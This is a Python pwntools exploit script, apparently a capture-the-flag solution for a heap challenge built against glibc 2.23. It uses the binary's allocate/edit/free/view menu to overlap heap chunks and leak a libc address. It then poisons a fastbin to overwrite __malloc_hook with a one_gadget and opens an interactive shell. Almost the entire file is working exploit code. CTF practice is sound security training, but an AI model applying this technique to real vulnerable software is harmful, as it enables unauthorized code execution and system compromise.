from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x1092
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(size):
    sla("Command:", "1")
    sla("Size: ", str(size))

def edit(idx, size, data):
    sla("Command:", "2")
    sla("Index: ", str(idx))
    sla("Size: ", str(size))
    sa("Content:", data)

def free(idx):
    sla("Command:", "3")
    sla("Index: ", str(idx))

def view(idx):
    sla("Command:", "4")
    sla("Index: ", str(idx))


alloc(0x68)
alloc(0x68)
alloc(0x68)
alloc(0x100)
alloc(0x100)
alloc(0x68)
alloc(0x68)
alloc(0x68)
alloc(0x68)

edit(3, 0x100, b"a"*0x100)
free(3)

edit(2, 0x70, b'b'*0x68 + p64(0x171))
edit(4, 0x58, b'c'*0x50 + p64(0x170))

# edit(0, 49, b'b'*48+b'c')
# alloc(20)
# edit(1, 0x20, b'c'*0x20)

alloc(0x108)
view(4)

rl()
libc.address = u64(re(8)) - 0x3c4b78
ic(hex(libc.address))
ic(hex(libc.sym['__malloc_hook']))


free(8)
free(1)

# edit(5, 0x80, b'e'*0x78 + p64(0xf1))
# edit(7, 0x80, b'f'*0x78 + p64(0xf0))

edit(0, 0x78, b'b'*0x68 + p64(0x71) + p64(libc.sym['__malloc_hook']-0x23))

alloc(0x68)
alloc(0x68)

edit(8, 0x13+8, b'd'*0x13 + p64(libc.address + 0x4526a))
alloc(0x10000)

# edit(5, 49, b'd'*40 + p64(0x31) + b'\x00')
# alloc(0x20)
# alloc(0x20)
# edit(0, 16, p64(libc.sym['__malloc_hook']))




io.interactive()
